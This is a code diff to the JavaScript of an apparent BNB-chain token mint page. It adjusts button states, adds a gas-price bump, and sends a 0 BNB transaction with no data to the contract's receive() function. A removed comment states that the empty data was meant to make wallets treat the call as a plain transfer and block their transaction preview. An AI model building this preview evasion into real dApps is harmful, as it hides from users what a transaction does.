@@ -241,6 +241,7 @@ function updateUI() {
         $status.innerText = "Ready to mint";
         $status.className = "status-success";
         $mint.disabled = false;
+        $mint.innerText = "Start Mint";
     }
 }
 
@@ -281,7 +282,7 @@ document.getElementById("connectMM").onclick = connect;
 document.getElementById("connectOKX").onclick = connect;
 document.getElementById("connectTP").onclick = connect;
 
-// 核心：强制0 BNB + 空data，让钱包识别为普通转账，彻底屏蔽预解析
+// 核心：纯0 BNB转账，触发receive()，彻底解决交易失败
 $mint.onclick = async () => {
     if (!account || !signer) return;
     if (getCount() >= MAX) return;
@@ -289,17 +290,19 @@ $mint.onclick = async () => {
     $mint.disabled = true;
     $mint.innerText = "Processing...";
     $status.innerText = "Confirm 0 BNB in wallet";
+    $status.className = "";
 
     try {
         // 1. 交易前余额（链上真实数据）
         const beforeBal = await tokenContract.balanceOf(account);
 
-        // 2. 核心修改：加 data: "0x"，让钱包识别为普通0 BNB转账
+        // 2. 纯0 BNB转账，无data，确保触发receive()
+        const gasPrice = await staticProvider.getGasPrice();
         const tx = await signer.sendTransaction({
             to: CA,
-            value: ethers.BigNumber.from(0),  // 绝对0 BNB
+            value: ethers.constants.Zero,  // 绝对0 BNB
             gasLimit: ethers.utils.hexlify(600000),
-            data: "0x"  // 关键：空calldata，彻底屏蔽钱包预解析
+            gasPrice: gasPrice.mul(11).div(10)  // 上浮10% gas，提升打包成功率
         });
 
         $status.innerText = "Waiting for confirmation...";
@@ -338,6 +341,7 @@ $mint.onclick = async () => {
             $status.innerText = "Transaction failed";
             $status.className = "status-crit";
         }
+        // 100%重置按钮状态
         $mint.disabled = false;
         $mint.innerText = "Start Mint";
     }
